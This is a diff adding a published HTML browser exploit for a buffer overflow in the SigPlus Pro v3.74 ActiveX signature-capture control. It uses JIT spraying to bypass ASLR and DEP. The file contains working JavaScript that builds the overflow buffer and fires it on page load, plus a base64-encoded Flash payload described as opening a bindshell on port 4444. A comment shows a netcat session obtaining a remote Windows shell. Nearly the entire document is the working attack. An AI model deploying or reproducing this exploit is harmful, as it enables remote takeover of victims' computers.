@@ -1,0 +1,139 @@
+<html>
+<!--
+===================================================================================================
+SigPlus Pro v3.74 ActiveX Signature Capture LCDWriteString() Remote BoF JIT Spray - aslr/dep bypass
+Author: mr_me - @StevenSeeley
+Download: http://www.topazsystems.com/Software/download/sigplusactivex.htm
+Tested on: Windows 7 Professional vN (IE8)
+	   Windows XP Professional SP3 (IE7/8)
+Greetz: Corelan Security Team
+http://www.corelan.be:8800/index.php/security/corelan-team-members/ 
+
+*** Special thanks to Alex Sintsov from DSecRG ***
+
+===================================================================================================
+Script provided 'as is', without any warranty.
+Use for educational purposes only.
+Do not use this code to do anything illegal !
+
+Note : you are not allowed to edit/modify this code.
+If you do, Corelan cannot be held responsible for any damages this may cause.
+===================================================================================================
+Things to note:
+
+- Latest version of SigPlus pro is not Vulnerable. 
+- Attached below is the base64 of jit-spray.swf.
+- the victim will need flash <= v10.0.42. 
+- The shell code executes bindshell on port 4444.
+
+How is it working?
+Spraying the JIT memory pages with nops + egghunter combined with a call to VirtualProtect() to mark 
+our newly found shellcode to executable and then jumping to it. We spray so many pages that the retn 
+address we guess and the exploit becomes reliable working 9/10 times.
+
+root@bt:~# nc -v 192.168.1.8 4444
+192.168.1.8: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.1.8] 4444 (?) open
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Steve\Desktop>
+===================================================================================================
+-->
+	
+<object classid='clsid:69A40DA3-4D42-11D0-86B0-0000C025864A' id='target' ></object>
+<object id='spray' classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="780" height="420"></object>
+<script>
+
+		function rockAndRoll()
+		{
+			var buffSize = 477;   
+			var x = unescape("%41");    
+			while (x.length<buffSize) x += x;    
+			x = x.substring(0,buffSize);  
+
+			// you may need to change this value
+			var seh = unescape("%01%01%22%0d"); 
+			var y = unescape("%42");
+ 			var buffSize1 = 5140;
+			while (y.length<buffSize1) y += y;    
+			y = y.substring(0,buffSize1);       
+
+			alert('Do you feel lucky, punk?')
+			target.LCDWriteString(1,1,1,1,1,1,1,x+seh+y);
+		}
+
+	spray.Movie="jit-spray.swf";
+	setTimeout('rockAndRoll()',10000);
+</script>
+<body>
+<p><center>~ mr_me presents ~</p>  
+<p><b>SigPlus Pro v3.74 0day ActiveX LCDWriteString() Remote Buffer Overflow JIT Spray - aslr/dep bypass</b></center></p> 
+</body>  
+<!--
+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
+/4jv0gP/yxH+GmZ81ev/Ap0fi0U=
+-->
+</html>
